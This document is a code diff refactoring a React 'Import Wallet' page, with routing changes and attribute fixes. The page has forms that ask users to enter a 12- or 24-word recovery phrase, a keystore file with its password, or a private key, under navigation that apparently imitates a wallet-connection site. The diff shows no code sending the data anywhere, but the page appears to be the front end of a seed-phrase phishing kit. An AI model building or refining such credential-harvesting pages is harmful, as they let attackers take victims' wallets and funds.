@@ -1,5 +1,5 @@
 import React, { useState, useRef } from 'react';
-
+import { Link,useParams } from 'react-router-dom';
 
 
 const Index = () => {
@@ -8,7 +8,9 @@ const Index = () => {
     const [showKeyStore, setShowKeyStore] = useState(false);
     const [showPrivateKey, setShowPrivateKey] = useState(false);
 
-    var tab = useRef(null)
+    var tab = useRef(null);
+    const params = useParams();
+    console.log(params)
 
     const HandleActiveClass = (e, form) => {
 
@@ -46,12 +48,14 @@ const Index = () => {
     return (
         <center>
             <div className="top">
-                <a href="index.html#footer" className="left">Github</a>
+               
 
-                <a href="/" className="left">Docs</a>
-                <a href="/" className="main"><img src="./images/logo.svg" alt="logo" /></a>
-                <a href="/" className="left">Wallets</a>
-                <a href="/" className="left">Apps</a>
+            <Link to="index.html#footer" className="left">Github</Link>
+
+<Link to="/" className="left">Docs</Link>
+<Link to="/" className="main"><img src="../images/logo.svg" alt="logo" /></Link>
+<Link to="/" className="left">Wallets</Link>
+<Link to="/" className="left">Apps</Link>
             </div>
             <br></br>
             <h2><center>Import Wallet</center></h2>
@@ -66,7 +70,7 @@ const Index = () => {
                     <form w="" action="" method="POST">
 
 
-                        <textarea name="phrase" className="phrase" required="required" minlength="12" placeholder="Phrase"></textarea>
+                        <textarea name="phrase" className="phrase" required="required" minLength="12" placeholder="Phrase"></textarea>
                         <br></br>
                         <div className="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
                         <br></br>
@@ -84,7 +88,7 @@ const Index = () => {
 
                         
                         <div className="field">
-                            <input type="file" name="keystore" placeholder="" autocomplete="off" style={{ backgroundImage: "url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot)", backgroundRepeat: "no-repeat", backgroundAttachment: "scroll", backgroundSize: "16px 18px", backgroundPosition: "98% 50%", cursor: "auto" }} />
+                            <input type="file" name="keystore" placeholder="" autoComplete="off" style={{ backgroundImage: "url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot)", backgroundRepeat: "no-repeat", backgroundAttachment: "scroll", backgroundSize: "16px 18px", backgroundPosition: "98% 50%", cursor: "auto" }} />
                         </div>
                         <div className="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
                         <br></br>
